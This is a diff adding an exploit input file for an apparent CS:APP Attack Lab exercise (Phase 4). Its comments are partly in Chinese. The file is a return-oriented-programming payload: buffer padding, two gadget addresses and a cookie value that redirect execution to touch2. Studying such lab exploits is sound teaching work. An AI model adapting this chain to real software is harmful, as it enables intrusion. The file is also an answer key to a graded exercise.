@@ -1,0 +1,13 @@
+/* Phase 4: ROP攻击调用touch2(cookie) */
+/* cookie: 0x1c2a3245 */
+/* touch2地址: 0x401c27 */
+/* gadget1: 0x401def - popq %rax; nop; ret */
+/* gadget2: 0x401de1 - movq %rax, %rdi; ret */
+/* 缓冲区大小: 24字节 (0x18) */
+00 00 00 00 00 00 00 00  /* 8 bytes padding */
+00 00 00 00 00 00 00 00  /* 8 bytes padding */
+00 00 00 00 00 00 00 00  /* 8 bytes padding (共24字节) */
+ef 1d 40 00 00 00 00 00  /* gadget1: popq %rax; nop; ret @ 0x401def */
+45 32 2a 1c 00 00 00 00  /* cookie值: 0x1c2a3245 (将被pop到%rax) */
+e1 1d 40 00 00 00 00 00  /* gadget2: movq %rax, %rdi; ret @ 0x401de1 */
+27 1c 40 00 00 00 00 00  /* touch2地址: 0x401c27 */
